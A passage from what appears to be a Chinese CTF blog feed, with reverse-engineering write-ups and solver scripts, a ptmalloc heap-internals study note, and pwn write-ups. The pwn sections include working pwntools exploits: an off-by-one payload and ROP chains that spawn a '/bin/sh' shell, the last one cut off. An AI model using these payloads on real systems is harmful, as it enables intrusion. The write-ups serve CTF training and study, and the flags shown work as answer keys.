&#39;&#39;<br>c &#x3D; [0]*19<br>for i in range(19):<br>    for j in range(128):<br>        temp &#x3D; j<br>        x &#x3D; int(temp &#x2F; 2 ** (i % 8)) &amp; 0xff<br>        y &#x3D; (temp &lt;&lt; (8 - i % 8)) &amp; 0xff<br>        x |&#x3D; y<br>        if b[i] &#x3D;&#x3D; x ^ i ^ 0x20:<br>            flag +&#x3D; chr(j)<br>            break<br>print flag<br></code></pre></td></tr></table></figure><h2 id="XCTF-4th-QCTF-2018-babyre"><a href="#XCTF-4th-QCTF-2018-babyre" class="headerlink" title="XCTF 4th-QCTF-2018 babyre"></a>XCTF 4th-QCTF-2018 babyre</h2><p>这题写了我好久啊<br>最后才发现是rust写的。。。<br>感觉最近写的这种非c的逆向比较多啊。。。<br>对于这种类型题目的写法。。。说实话，只能怼汇编<br>配合黑盒上手<br>插件的话能用就用，但是用插件的前提是你认得出这是什么语言<br><img src="4.png" alt="4"><br>首先是跟<br>找到关键函数<br>可以看到程序有俩次加密<br>在加密之前有一次移位操作<br>进第一次加密的时候就能发现了，按照某种顺序打乱字符串<br>第一次加密其实就是加法<br>第二次是移位后or<br><img src="5.png" alt="5"><br>最后是匹配<br>可以看到匹配的数组<br>长度的话前面有一次验证，有个跳转，这边就不上了。<br>直接上代码吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs asm">b &#x3D; [0xDA, 0xD8, 0x3D, 0x4C, 0xE3, 0x63, 0x97, 0x3D, 0xC1, 0x91,<br>  0x97, 0x0E, 0xE3, 0x5C, 0x8D, 0x7E, 0x5B, 0x91, 0x6F, 0xFE,<br>  0xDB, 0xD0, 0x17, 0xFE, 0xD3, 0x21, 0x99, 0x4B, 0x73, 0xD0,<br>  0xAB, 0xFE]<br>flag &#x3D; &#39;&#39;<br>a &#x3D; [0]*32<br>for i in range(0,32,4):<br>    for j in range(0xff):<br>        temp &#x3D; j<br>        if (temp&gt;&gt;2)|(temp&lt;&lt;6)&amp;0xff &#x3D;&#x3D; b[(i+9)%32]:<br>            a[(i+9)%32] &#x3D; j<br>        elif (temp&gt;&gt;7)|(temp&lt;&lt;1)&amp;0xff &#x3D;&#x3D; b[(i+10)%32]:<br>            a[(i+10)%32] &#x3D; j<br>        elif (temp&gt;&gt;4)|(temp&lt;&lt;4)&amp;0xff &#x3D;&#x3D; b[(i+11)%32]:<br>            a[(i+11)%32] &#x3D; j<br>        elif (temp&gt;&gt;5)|(temp&lt;&lt;3)&amp;0xff &#x3D;&#x3D; b[(i+12)%32]:<br>            a[(i+12)%32] &#x3D; j<br>for i in range(len(a)):<br>    if i%4 &#x3D;&#x3D; 0:<br>        a[(i + 3) % 32] &#x3D; chr(a[(i+3)%32]-0x81)<br>    elif i%4 &#x3D;&#x3D; 1:<br>        a[(i + 3) % 32] &#x3D; chr(a[(i+3)%32]-7)<br>    elif i%4 &#x3D;&#x3D; 2:<br>        a[(i + 3) % 32] &#x3D; chr(a[(i+3)%32]-0x12)<br>    else:<br>        a[(i + 3) % 32] &#x3D; chr(a[(i+3)%32]-0x58)<br>for i in range(0,32,4):<br>    flag +&#x3D; a[i+1]<br>    flag +&#x3D; a[i+3]<br>    flag +&#x3D; a[i]<br>    flag +&#x3D; a[i+2]<br>print flag<br></code></pre></td></tr></table></figure><p>花费大把时间怼出来一题还是蛮爽的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>国赛write_up</title>
    <link href="/2019/04/24/%E5%9B%BD%E8%B5%9Bwrite-up/"/>
    <url>/2019/04/24/%E5%9B%BD%E8%B5%9Bwrite-up/</url>
    
    <content type="html"><![CDATA[<p>东大装逼，国赛懵逼。<br>这就是CTF吧。。。<br>re只写出来俩道。。。为什么要对大一萌新这样。。。</p><a id="more"></a><h2 id="easyGo"><a href="#easyGo" class="headerlink" title="easyGo"></a>easyGo</h2><p>一开始我是完全不知道这是Go语言，第一反应是某种混淆导致这种奇葩场面发生(ida反汇编出来一堆shit)<br>太菜了啊。。。<br>可惜还是在20分钟内写出来了<br>主要是黑盒。。。还有几分的运气。。。<br><img src="1.png" alt="1"><br>首先从start开始啊<br>因为函数太多而且找不到main。。。<br>慢慢跟，中间貌似有检查内存断点的。。。反调试。。。<br>断点稍微注意一下下鸭<br>然后可以找到入口<br><img src="2.png" alt="2"><br>还能找到一串诡异的字符串，还有一个码表一样的东西<br><img src="3.png" alt="3"><br>这个时候就能猜他是base64了<br>直接猜一下解一下出答案<br><img src="4.png" alt="4"><br>但是仔细看看这个。。。其实这是个解码base64的函数。。。<br>就是帮你把那串诡异的字符串解码的。。。<br>call完后去内存一看就能发现<br><img src="5.png" alt="5"><br>难怪这题目才五分钟就被人拿下了。。。<br>tql</p><h2 id="bbvvmm"><a href="#bbvvmm" class="headerlink" title="bbvvmm"></a>bbvvmm</h2><p>这题我灵机一动写出来了<br>窝的写法肯定是最快滴~~~<br>//其实是刷了小聪明<br>首先看看id</p><h3 id="id"><a href="#id" class="headerlink" title="id"></a>id</h3><p><img src="6.png" alt="6"><br>先看看整体逻辑啊<br><img src="7.png" alt="7"><br>其实id么最难的是在那个sm4<br>没看出来sm4咋办？<br>放心，当时窝也没看出来，完全不知道sm4是什么加密。<br>先把base64的码表改好<br>解出他在sm4后应该等于的值<br>很简单嘛，这边不上脚本<br>就是EF468DBAF985B2509C9E200CF3525AB6<br>然后看这个sm4<br>其实呢仔细看看可以看出部分对称的性质<br>我那个时候就直接把EF468DBAF985B2509C9E200CF3525AB6输进去<br>然后把密钥倒着输入<br>他出来的就是明文的16进制了<br><img src="8.png" alt="8"><br>因为密钥是通过r8寄存器来传的，记录下每个key<br>然后倒着改就ok<br>解出来是badrer12</p><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>这个密码我当时是直接patch源文件<br>因为你想呀，这是个vm，vm很花费时间//其实是我不会<br>但是符号执行什么的对这种看上去恶心的东西效果贼棒<br>所以为什么不用angr呢？<br>但是angr有缺陷，稍微复杂一些的加密<br>甚至是一个base//比如这边转16进制就是base16<br>就解不出<br>所以要patch<br><img src="9.png" alt="9"><br>patch的要彻底<br>完事后再检查一下，输入6个1和在源文件中输入6个1，返回的是否一样<br>然后就可以angr了<br>跑了8分钟，出答案<br>xyz{|}<br>这边我把patch的文件也给下吧<br><a href="download/111">111</a><br>但是提交的时候又有问题了。。。<br>不能直接提交。。。<br>还要用send来。。。<br>烦死。。。<br>自闭。。。</p><h2 id="some-conclusions"><a href="#some-conclusions" class="headerlink" title="some conclusions"></a>some conclusions</h2><p>其实呢<br>我感觉第一题easyGo出的特别好<br>因为现在国内有大部分的水题，如我们南邮的第一题<br>都是打开搜索字符串一下子就出flag的<br>这题就不一样了<br>虽然说性质还是一样，就是明文比较<br>但是<br>1.利用go语言编写，go语言字符串结尾没有0，导致ida弄出一大串字符串<br>这就防止了直接搜索字符串看到flag或者定位关键函数//但还是可以通过搜text或者16进制匹配搜到<br>2.flag是魔改base加密后放在内存中的，程序运行后才进行解密，然后与你的输入直接进行比较<br>这更让你不好看出<br>可以说出题人很猛。。。<br>题目很适合入门。<br>希望以后我也能做一个这么优秀的出题人吧。</p><p>还有一个是bbvvmm<br>一个sm4窝这种萌新是真没看出来，但是凭着对称的感觉写出来了。<br>vm也很猛。。。<br>这次是窝运气好吧，如果vm稍微复杂些，那angr就凉了。。。<br>迟早窝会填上vm这个巨坑的。。。</p><p>另外几题比较不常见。。。萌新很蒙蔽。。。但确实能张张见识<br>坐等dalaos的wp</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>精读《glibc内存管理ptmalloc源代码分析》</title>
    <link href="/2019/04/18/%E7%B2%BE%E8%AF%BB%E3%80%8Aglibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E3%80%8B/"/>
    <url>/2019/04/18/%E7%B2%BE%E8%AF%BB%E3%80%8Aglibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<p>前言:最近在学unlink和各种堆相关的攻击技巧<br>但是因为对堆的分配啥的不怎么熟悉，导致很头疼<br>这次来好好学习下，而且这也是Atum大佬的推荐阅读。</p><a id="more"></a><h2 id="32位内存布局"><a href="#32位内存布局" class="headerlink" title="32位内存布局"></a>32位内存布局</h2><p><img src="1.png" alt="1"><br>可以看到总共4G内存，最上面1个G是内核空间的。<br>从上往下就是1G内核，栈，mmap映射，堆区，bss段，data段和text段。<br>堆和mmap映射区域相对增长，还有就是栈有个最大限制。</p><h2 id="64位内存布局"><a href="#64位内存布局" class="headerlink" title="64位内存布局"></a>64位内存布局</h2><p><img src="2.png" alt="2"><br>因为在64位下有足够的内存空间。mmap和栈就相对增长了。<br>堆区因为空间足够，不太可能会往上覆盖到mmap映射区，至于其他，和32位差不多。</p><h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p><img src="3.png" alt="3"><br>用户所请求的空间在ptmalloc都会用一个Chunk表示。<br>可以看到上图是一个没有被free的Chunk<br>第一个是前一个(空闲)Chunk的大小<br>第二个是当前Chunk的大小，第三位代表了不同的意思<br>这边主要看P位，P位表示前一个chunk是否在使用<br>如果是1则在，那么第一个表示前一个chunk大小的四字节就无效。<br>如果为0，则表示前一个chunk空闲，这时表示的size就有效了。<br>第一个分配的chunk的p位总是为1.<br><img src="4.png" alt="4"><br>上图是一个被free后的chunk<br>可以看到M位不存在。<br>还有就是多了4个指针(看情况)<br>一个是fd，指向后一个空闲的chunk<br>还有就是bd，指向前一个空闲的chunk<br>下面还有俩个分别代表大小<br>但是这只有large bin才会有。<br>一般都是2个指针。<br>还可以看到，下一个chunk的previous size没了<br>其实这是因为它正在使用中，那四个字节本来就没有用，就可以直接给上一个chunk申请的空间了。<br>这便是chunk的空间复用。</p><h2 id="chunk空间复用"><a href="#chunk空间复用" class="headerlink" title="chunk空间复用"></a>chunk空间复用</h2><p>可以看到当chunk空闲时，至少需要16个字节空间来放那四个指针。<br>在使用时呢，首先有俩个指针8字节，再加上自己申请的，再减去4字节，为什么要减去4字节，其实是因为占用了下一个chunk的previous size的那四个字节。<br>所以此时chunk空间大小为<br>in_use_size = (用户请求大小+ 8 - 4 ) align to 8B<br>综上可以看出，chunk的大小为max(in_use_size, 16)。<br>这就是用户请求分配时，ptmalloc实际分配的大小。</p><h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><p><img src="5.png" alt="5"><br>ptmalloc会统一管理被用户free掉的chunk，如上图所示。<br>一共维护了128个bin，并用数组来存储。<br>bin中的chunk被双向链表链接。<br>可以看到第一个为unsorted bin<br>然后就是small bins<br>small bins每个之间相差8字节。<br>里面的chunk被双向链表链接，其中用户申请时，small bins都是从尾补开始的，<br>而用户释放的都被连到了链表头部。<br>还有一个就是large bins，没什么好说的。<br>当空闲的chunk被链接到bin中的时候，都会把这chunk下一个的P位置为0，以表示前一个空闲。<br>他还会检查次chunk前一个chunk是否空闲，如果是则会合并俩个chunk，并把它放到unsorted bin中。<br>当然不是所有都会放到unsorted bin中，还会根据大小选择是否放入fast bins</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>当大小小于64字节的chunk被释放后首先会放入fast bins中，在此时其下一个P位不会被置0.<br>以便快速分配。当需要给用户分配的大小小于64字节时，ptmalloc会先在fast bins中寻找，<br>如果没有则将相邻的chunk合并后放入unsorted bin，再在unsorted bin中寻找。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>当用户释放的chunk大于64字节或者fast bins中的chunk合并后，都会放进unsorted bin中。当fast bins中找不到用户所需求的chunk时，<br>ptmalloc则会寻找unsorted bin，如果没有，再将unsorted bin中的chunk放进bins中，再在bins中寻找。</p><p>说到底，fast bins 和 unsorted bin其实就是为了提高分配速度而存在的。</p><p>//todo</p>]]></content>
    
    
    
    <tags>
      
      <tag>reading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>susctf 2019</title>
    <link href="/2019/04/14/susctf-2019/"/>
    <url>/2019/04/14/susctf-2019/</url>
    
    <content type="html"><![CDATA[<p>这次susctf我们队伍第一鸭~~~<br>re都ak了<br>五个re，四个re都是一血<br>没错是我干的</p><a id="more"></a><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="SIGN"><a href="#SIGN" class="headerlink" title="SIGN"></a>SIGN</h2><p>直接搜索字符串<br>就出答案了<br><img src="1.png" alt="1"><br>susctf{RwVIphVJg9BFYAEqRYf6mnX38Vy467a9}</p><h2 id="testfile"><a href="#testfile" class="headerlink" title="testfile"></a>testfile</h2><p><img src="2.png" alt="2"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; &#39;STQ@PC&#125;&amp;)(FZXj&#96;fitkn&#39;<br>flag &#x3D; &#39;&#39;<br>for i in range(len(a)):<br>    flag +&#x3D; chr(ord(a[i])^i)<br>print flag<br>#SUSCTF&#123;!!!LQTgniyey&#125;<br></code></pre></td></tr></table></figure><p>水题啊</p><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><p>稍微有点难度的题目<br><img src="3.png" alt="3"><br>前面都是对时间的验证<br>肯定是不满足的，所以直接patch一下jmp到check那<br>至于时间验证怎么搞，用z3解一下或者手解一下然后改下值就行了<br>来看看check部分<br><img src="4.png" alt="4"><br>就是个初始化操作<br>还有取下标啊各种操作<br><img src="5.png" alt="5"><br>来看看加密<br><img src="6.png" alt="6"><br>这边就是俩个下标相加膜36后取码表<br>简单的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">dest &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;<br>a &#x3D; &#39;9165do0fdbbz2cb8aiay1f65e6m4qd26&#39;<br>m &#x3D; [0]*35<br>m[0] &#x3D; 0x11<br>m[1] &#x3D; 0x11<br>m[2] &#x3D; 0xb<br>flag &#x3D; [0]*32<br>for i in range(len(a)):<br>    for j in range(len(dest)):<br>        if a[i] &#x3D;&#x3D; dest[(j+m[i])%36]:<br>            flag[i] &#x3D; j<br>            m[i+3] &#x3D; j<br>print flag<br>print m<br>aaa &#x3D; &#39;susctf&#123;&#39;<br>for i in range(len(flag)):<br>    aaa +&#x3D; dest[flag[i]]<br>aaa +&#x3D; &#39;&#125;&#39;<br>print aaa<br># susctf&#123;skvdttnmkopfenwunmgbfzvqfbwpfhdr&#125;<br></code></pre></td></tr></table></figure><p>这题其实恶心就恶心再前面时间<br>时间是多解的<br>那个判断相乘是否为8那里<br>还有一个是。。。<br>明明这边要小写的susctf提交却要大写的？！<br>后来我直接像出题人反应，但这并不影响一血</p><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>侧信道<br>我前面有一篇blog专门写过mov混淆<br>这个也一样<br><img src="7.png" alt="7"><br>SUSCTF{justatestflag}<br>不上代码了<br>代码有点小bug导致没有秒杀这题</p><h2 id="easyC"><a href="#easyC" class="headerlink" title="easyC#"></a>easyC#</h2><p>hashcat 爆破<br>这题应该是最难的…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>水题。。。<br>直接cat flag<br>或者稍微变一下命令，他不是说不能sh吗<br>那就s’h’<br>输入s’h’也行</p><h2 id="ret2moon"><a href="#ret2moon" class="headerlink" title="ret2moon"></a>ret2moon</h2><p>典型的off by one<br><img src="8.png" alt="8"><br>有个地方要注意就是<br>v2是int型<br>直接上代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>a &#x3D; process(&#39;ret2moon&#39;)<br>aaa &#x3D; &#39;a&#39;*16 + p32(0x38)<br>a.recvuntil(&quot;you can say someing before you wake&quot;)<br>a.sendline(aaa)<br>a.recvuntil(&quot;one more word&quot;)<br>pay &#x3D; chr(0xe8)<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN养成计划</title>
    <link href="/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/"/>
    <url>/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<p>最近观摩了下Atum大佬PWN学习<br>决定要把每一个例题都写一下！！！<br>长期更新<br>立下flag</p><a id="more"></a><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="defcon-2015-qualifier-R0pbaby"><a href="#defcon-2015-qualifier-R0pbaby" class="headerlink" title="defcon 2015 qualifier: R0pbaby"></a>defcon 2015 qualifier: R0pbaby</h2><p>首先看下程序，主要是个菜单<br><img src="1.png" alt="1"><br>菜单很简单<br>1查找lib基地址<br>2查找你要寻找的libc函数<br>3实施攻击<br>4退出<br>checksec一下看下开了什么保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">Arch:     amd64-64-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    FORTIFY:  Enabled<br><br></code></pre></td></tr></table></figure><p>有PIE<br>但这不影响，因为能查看地址</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>标题就已经提示用ROP了<br>这边主要的溢出点在<br>memcpy那边</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>既然能查看地址<br>那就不怎么难了<br>首先这是64位程序<br>传参的话，’/bin/sh’应该是放在rdi寄存器里的<br>用ROPgadget找到其偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep &quot;rdi&quot;<br></code></pre></td></tr></table></figure><p>然后是’/bin/sh’偏移和sys的偏移<br>接下去就能溢出了<br>发现memcpy(&amp;savedregs, nptr, v6)中<br>savedregs就是rbp所在处<br>所以直接输入8个a然后输入pop_rdi_ret的地址，紧跟着’/bin/sh’的地址和sys地址<br>pop_rdi_ret地址计算的话就用程序的2选项得到的sys地址加上pop_ret偏移减去sys偏移<br>上代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>a &#x3D; process(&quot;.&#x2F;r0pbaby&quot;)<br>a.recvuntil(&quot;: &quot;)<br>a.send(&#39;2\n&#39;)<br>a.recvuntil(&quot;: &quot;)<br>a.send(&#39;system\n&#39;)<br>aaa &#x3D; a.recv()<br>add &#x3D; aaa[15:33]<br>addr &#x3D; int(add,16)<br>print hex(addr)<br>a.sendline(&#39;3&#39;)<br>a.recvuntil(&quot;Enter bytes to send (max 1024): &quot;)<br>a.send(&#39;32\n&#39;)<br>#gdb.attach(a)<br>pay &#x3D; &#39;a&#39;*8 + p64(addr+0x221c8-0x41FD0) + p64(addr+0x17C489-0x41FD0) + p64(addr)<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>说下收获<br>1.64位传参，首先是寄存器然后栈，利用方式：ROPgadget。<br>2.ROPgadget命令使用</p><h2 id="AliCTF-2016-vss"><a href="#AliCTF-2016-vss" class="headerlink" title="AliCTF 2016: vss"></a>AliCTF 2016: vss</h2><p>这题对逆向手比较友好~~~<br>稍微调试一下就知道题目在干什么了<br>先看看程序<br><img src="2.png" alt="2"><br>首先是一个登录<br>输入密码即可<br>进去看看判断函数<br><img src="3.png" alt="3"><br>通过调试可以看到这边有个类似memcpy的操作<br>所以可以通过输入的pwd来溢出这边的v2<br>具体可以通过构造ropchain</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这边已经找到溢出点了，但是有个问题<br>就是栈空间不够<br>只有0x50空间<br>所以这边需要用到stack pivot<br>即劫持栈指针<br>把rsp劫持到上一个调用他的函数中的栈去<br>用ROPgadget找一下就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>from struct import pack<br># Padding goes here<br>p &#x3D; &#39;&#39;<br><br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046f208) # pop rax ; ret<br>p +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401823) # pop rdi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043ae05) # pop rdx ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; 